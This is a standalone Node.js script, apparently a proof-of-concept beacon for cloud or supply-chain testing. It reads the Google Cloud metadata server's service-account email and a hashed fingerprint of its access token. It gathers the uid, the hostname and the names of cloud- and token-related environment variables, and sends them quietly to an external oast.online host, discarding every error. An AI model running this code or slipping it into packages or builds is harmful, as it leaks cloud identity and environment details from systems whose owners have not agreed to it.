const crypto = require("crypto");
const phase = process.argv[2] || "unknown";
const headers = {"Metadata-Flavor": "Google"};
async function read(url) {
  const response = await fetch(url, {headers, signal: AbortSignal.timeout(1500)});
  return await response.text();
}
(async () => {
  let email = "unavailable";
  let token = "unavailable";
  try {
    email = await read("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email");
  } catch (error) {
    email = "error-" + error.name;
  }
  try {
    const body = JSON.parse(await read("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"));
    const value = body.access_token || "";
    token = value ? value.length + "-" + crypto.createHash("sha256").update(value).digest("hex").slice(0, 16) : "empty";
  } catch (error) {
    token = "error-" + error.name;
  }
  const names = Object.keys(process.env).filter(name => /(GOOGLE|GCP|TOKEN|K_SERVICE|K_REVISION|HOSTNAME|CLOUD|PROJECT)/i.test(name)).sort().join(",");
  const path = "/" + encodeURIComponent(phase) + "/uid-" + (process.getuid ? process.getuid() : "na") + "/host-" + encodeURIComponent(require("os").hostname()) + "/meta-" + encodeURIComponent(email.trim()) + "/tok-" + encodeURIComponent(token) + "?env=" + encodeURIComponent(names);
  await fetch("https://db7no0s1pgvhhbtki0qggouitap954sfn.oast.online" + path, {signal: AbortSignal.timeout(3000)}).catch(() => {});
})().catch(() => {});
